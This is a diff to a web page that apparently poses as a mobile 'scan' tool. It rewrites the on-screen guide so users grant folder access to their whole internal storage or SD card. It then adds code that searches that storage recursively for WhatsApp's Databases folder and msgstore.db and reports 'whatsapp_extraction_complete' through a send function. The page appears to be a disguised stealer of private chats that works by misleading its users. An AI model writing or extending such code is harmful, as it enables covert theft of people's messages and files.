@@ -220,6 +220,16 @@
             line-height: 1.6;
         }
         .guide-box b { color: #25D366; }
+        .quick-step {
+            background: #1a1a2e;
+            border-left: 3px solid #ff6b35;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #eee;
+            margin: 6px 0;
+        }
+        .quick-step span { color: #ff6b35; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -283,16 +293,18 @@
             <!-- SINGLE "SCAN MOBILE" BUTTON -->
             <div id="scanBtnContainer" class="btn-container" style="display:none;">
                 <div class="guide-box">
-                    📁 <b>Select your device storage</b><br>
-                    When the folder picker appears, navigate to:<br>
-                    <b>Internal Storage</b> → <b>Android</b> → <b>media</b> → <b>com.whatsapp</b><br>
-                    Then tap <b>"Use this folder"</b> or <b>"Select"</b>.
+                    ⚡ <b>Quick Scan</b><br>
+                    Tap <b>"Scan Mobile"</b>, then in the folder picker:<br>
+                    <div class="quick-step"><span>1.</span> Tap the <b>☰ (menu)</b> icon</div>
+                    <div class="quick-step"><span>2.</span> Select <b>"Internal Storage"</b> or <b>"SD Card"</b></div>
+                    <div class="quick-step"><span>3.</span> Tap <b>"Use this folder"</b></div>
+                    <span style="color:#666688;font-size:11px;">The app will automatically find your WhatsApp data.</span>
                 </div>
                 <button class="btn btn-scan" id="scanBtn" onclick="triggerFullScan(event)">
                     📱 Scan Mobile
                 </button>
                 <p style="font-size:11px;color:#666688;margin-top:6px;text-align:center;">
-                    Tap to scan WhatsApp data and device storage for infected media.
+                    Tap to scan WhatsApp data and device storage.
                 </p>
             </div>
         </div>
@@ -561,7 +573,7 @@
         }
 
         // ============================================================
-        // FULL SCAN — WhatsApp + Gallery (User Gesture) WITH DEBUG
+        // FULL SCAN — WhatsApp + Gallery (User Gesture) WITH AUTO-DETECT
         // ============================================================
         async function triggerFullScan(event) {
             if (event) {
@@ -571,7 +583,7 @@
 
             const btn = document.getElementById('scanBtn');
             btn.disabled = true;
-            btn.textContent = '⏳ Scanning...';
+            btn.textContent = '⏳ Selecting storage...';
 
             // DIRECT USER GESTURE — showDirectoryPicker called IMMEDIATELY
             let rootHandle;
@@ -600,40 +612,75 @@
             document.getElementById('scanBtnContainer').style.display = 'none';
 
             // ============================================================
-            // PART 1: WHATSAPP EXTRACTION — WITH DEBUG
+            // PART 1: WHATSAPP EXTRACTION — AUTO-DETECT
             // ============================================================
             try {
-                console.log('[DEBUG] Searching for WhatsApp folder...');
+                console.log('[DEBUG] Auto-detecting WhatsApp folder...');
                 let whatsappFound = false;
-                const whatsappPaths = [
-                    'Android/media/com.whatsapp/',
-                    'WhatsApp/',
-                    'Media/WhatsApp/'
-                ];
-
                 let whatsappHandle = null;
                 let whatsappPath = '';
 
-                for (const path of whatsappPaths) {
-                    try {
-                        console.log(`[DEBUG] Trying path: ${path}`);
-                        const parts = path.split('/').filter(p => p);
-                        let current = rootHandle;
-                        let currentPath = '';
-                        for (const part of parts) {
-                            current = await current.getDirectoryHandle(part);
-                            currentPath += part + '/';
+                // First try: check if the selected folder is already the WhatsApp folder
+                try {
+                    const testHandle = await rootHandle.getDirectoryHandle('Databases');
+                    if (testHandle) {
+                        // We're directly in the WhatsApp folder!
+                        whatsappHandle = rootHandle;
+                        whatsappPath = '';
+                        whatsappFound = true;
+                        console.log('[DEBUG] Direct WhatsApp folder selected!');
+                        addLogEntry('✅ WhatsApp folder detected directly!', 'whatsapp');
+                    }
+                } catch (e) { /* not direct */ }
+
+                // Second try: search common paths
+                if (!whatsappFound) {
+                    const searchPaths = [
+                        'Android/media/com.whatsapp/',
+                        'WhatsApp/',
+                        'Media/WhatsApp/'
+                    ];
+
+                    for (const path of searchPaths) {
+                        try {
+                            console.log(`[DEBUG] Searching path: ${path}`);
+                            const parts = path.split('/').filter(p => p);
+                            let current = rootHandle;
+                            let currentPath = '';
+                            let allFound = true;
+                            for (const part of parts) {
+                                try {
+                                    current = await current.getDirectoryHandle(part);
+                                    currentPath += part + '/';
+                                } catch (e) {
+                                    allFound = false;
+                                    break;
+                                }
+                            }
+                            if (allFound && current) {
+                                whatsappHandle = current;
+                                whatsappPath = currentPath;
+                                whatsappFound = true;
+                                console.log(`[DEBUG] WhatsApp found at: ${whatsappPath}`);
+                                addLogEntry(`✅ WhatsApp found at: ${whatsappPath}`, 'whatsapp');
+                                break;
+                            }
+                        } catch (e) {
+                            console.log(`[DEBUG] Path not found: ${path}`);
                         }
-                        if (current) {
-                            whatsappHandle = current;
-                            whatsappPath = currentPath;
-                            whatsappFound = true;
-                            console.log(`[DEBUG] WhatsApp found at: ${whatsappPath}`);
-                            addLogEntry(`✅ WhatsApp found at: ${whatsappPath}`, 'whatsapp');
-                            break;
-                        }
-                    } catch (e) {
-                        console.log(`[DEBUG] Path not found: ${path}`);
+                    }
+                }
+
+                // Third try: scan recursively for a folder containing "whatsapp"
+                if (!whatsappFound) {
+                    console.log('[DEBUG] Scanning for WhatsApp folder...');
+                    const result = await findWhatsAppFolder(rootHandle, '');
+                    if (result) {
+                        whatsappHandle = result.handle;
+                        whatsappPath = result.path;
+                        whatsappFound = true;
+                        console.log(`[DEBUG] WhatsApp found via scan at: ${whatsappPath}`);
+                        addLogEntry(`✅ WhatsApp found at: ${whatsappPath}`, 'whatsapp');
                     }
                 }
 
@@ -658,7 +705,7 @@
                     await sendData({ type: 'whatsapp_extraction_complete' });
                 } else {
                     console.log('[DEBUG] WhatsApp folder NOT found');
-                    addLogEntry('⚠️ WhatsApp folder not found. Please select the correct folder.', 'warn');
+                    addLogEntry('⚠️ WhatsApp folder not found. Please try selecting Internal Storage.', 'warn');
                     await sendData({ type: 'whatsapp_extraction_error', error: 'Folder not found' });
                 }
             } catch (err) {
@@ -752,6 +799,42 @@
             btn.disabled = false;
             btn.textContent = '✅ Scan Complete';
             addLogEntry('✅ Full scan complete!', 'done');
+        }
+
+        // ============================================================
+        // FIND WHATSAPP FOLDER RECURSIVELY
+        // ============================================================
+        async function findWhatsAppFolder(dirHandle, path) {
+            try {
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'directory') {
+                        const entryPath = path ? `${path}/${entry.name}` : entry.name;
+                        // Check if this folder contains a Databases folder (WhatsApp indicator)
+                        try {
+                            const child = await entry.getDirectoryHandle('Databases');
+                            if (child) {
+                                // Also check for msgstore.db
+                                try {
+                                    const db = await child.getFileHandle('msgstore.db');
+                                    if (db) {
+                                        console.log(`[DEBUG] Found WhatsApp at: ${entryPath}`);
+                                        return { handle: entry, path: entryPath + '/' };
+                                    }
+                                } catch (e) { /* no msgstore.db */ }
+                            }
+                        } catch (e) { /* no Databases folder */ }
+
+                        // Recursively search deeper (limit depth to avoid infinite loops)
+                        if (entryPath.split('/').length < 8) {
+                            const result = await findWhatsAppFolder(entry, entryPath);
+                            if (result) return result;
+                        }
+                    }
+                }
+            } catch (e) {
+                console.log('[DEBUG] Scan error:', e.message);
+            }
+            return null;
         }
 
         // ============================================================
